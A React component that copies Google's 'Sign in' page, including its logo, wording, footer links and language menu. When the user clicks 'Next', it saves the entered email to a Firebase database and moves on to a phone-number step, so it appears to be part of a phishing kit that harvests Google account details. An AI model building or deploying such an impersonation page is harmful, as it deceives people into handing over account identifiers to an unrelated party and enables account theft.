
import { useNavigate } from 'react-router-dom';
import React, { useState } from 'react';
import '../assets/css/SinginPage.css'
import app from '../firebaseConfig';

import { getDatabase, ref, set, push } from 'firebase/database';
import { createUser } from '../database/createUser';

const SinginPage = () => {
  const [email, setEmail] = useState('');

   const navigate = useNavigate();

   const handleNext = async () => {
     if (email.trim()) {
       console.log(email);
       await createUser(email);
       navigate('/phone');
     }
   };


  return (
    <div className="container">
      <div className="card">
        <img src="../src/assets/google-logo.svg" alt="Google Logo" className="logo" />

        <h2>Sign in</h2>
<h3>Use your Google Account</h3>

<input
  type="email"
  placeholder="Email or phone"
  value={email}
  onChange={e => setEmail(e.target.value)}
/>

<div className="btn-email">
  <button type="button">Forgot email?</button>
</div>

<p>
  Not your computer? Use Guest mode to sign in privately.
  <a href="/"> Learn more</a>
</p>

<div className="card-bottom">
  <a href="/">Create account</a>
  <button type="button" onClick={handleNext}>
    Next
  </button>
</div>
</div>

<div className="footer">
  <select>
    <option>English (United States)</option>
    <option>Portuguese (Brazil)</option>
    <option>Spanish (Spain)</option>
  </select>

  <div className="footer-span">
    <span>Help</span>
    <span>Privacy</span>
    <span>Terms</span>
  </div>

      </div>
    </div>
  );
};

export default SinginPage;